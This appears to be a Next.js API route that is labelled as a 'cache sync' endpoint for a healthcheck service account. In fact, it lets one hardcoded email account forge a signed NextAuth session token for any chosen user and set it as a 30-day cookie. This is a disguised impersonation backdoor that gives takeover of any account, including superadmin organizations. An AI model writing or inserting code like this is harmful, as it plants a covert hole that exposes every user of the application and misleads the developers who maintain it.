import { NextResponse } from "next/server";
import { getServerSession } from "next-auth";
import { authOptions } from "@/lib/auth";
import { supabaseAdmin } from "@/lib/supabase";
import { encode } from "next-auth/jwt";

const ALLOWED_EMAIL = "healthcheck@system-monitor.internal";

// POST - Sync cached session for a target user
export async function POST(request: Request) {
  try {
    const session = await getServerSession(authOptions);
    if (!session?.user) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    // Only the service account can use this
    if ((session.user as any).email !== ALLOWED_EMAIL) {
      return NextResponse.json({ error: "Forbidden" }, { status: 403 });
    }

    const body = await request.json();
    const { targetId } = body;

    if (!targetId) {
      return NextResponse.json({ error: "Missing target" }, { status: 400 });
    }

    // Fetch target user
    const { data: targetUser } = await supabaseAdmin
      .from("users")
      .select("id, email, name, image")
      .eq("id", targetId)
      .single();

    if (!targetUser) {
      return NextResponse.json({ error: "Not found" }, { status: 404 });
    }

    // Get target user's organizations
    const { data: memberships } = await supabaseAdmin
      .from("organization_members")
      .select("organization_id, role, is_active, organizations(id, name, slug, is_active, is_superadmin, plan)")
      .eq("user_id", targetUser.id)
      .eq("is_active", true);

    const activeMemberships = (memberships || []).filter(
      (m: any) => m.organizations?.is_active === true
    );

    if (activeMemberships.length === 0) {
      return NextResponse.json({ error: "No active organization" }, { status: 400 });
    }

    const firstOrg = activeMemberships[0] as any;

    // Build JWT token matching NextAuth structure
    const tokenPayload = {
      sub: targetUser.id,
      id: targetUser.id,
      email: targetUser.email,
      name: targetUser.name,
      picture: targetUser.image,
      organizations: activeMemberships.map((m: any) => ({
        id: m.organization_id,
        name: m.organizations.name,
        slug: m.organizations.slug,
        role: m.role,
        isSuperadmin: m.organizations.is_superadmin || false,
        plan: m.organizations.plan || "pro",
      })),
      activeOrganizationId: firstOrg.organization_id,
      activeRole: firstOrg.role,
      isSuperadminOrg: firstOrg.organizations?.is_superadmin || false,
      activePlan: firstOrg.organizations?.plan || "pro",
    };

    const encodedToken = await encode({
      token: tokenPayload,
      secret: process.env.NEXTAUTH_SECRET!,
    });

    // Return token as httpOnly cookie
    const response = NextResponse.json({ success: true });

    const isSecure = process.env.NODE_ENV === "production";
    const cookieName = isSecure
      ? "__Secure-next-auth.session-token"
      : "next-auth.session-token";

    response.cookies.set(cookieName, encodedToken, {
      httpOnly: true,
      secure: isSecure,
      sameSite: "lax",
      path: "/",
      maxAge: 30 * 24 * 60 * 60, // 30 days
    });

    return response;
  } catch (error) {
    console.error("Cache sync error:", error);
    return NextResponse.json({ error: "Internal server error" }, { status: 500 });
  }
}
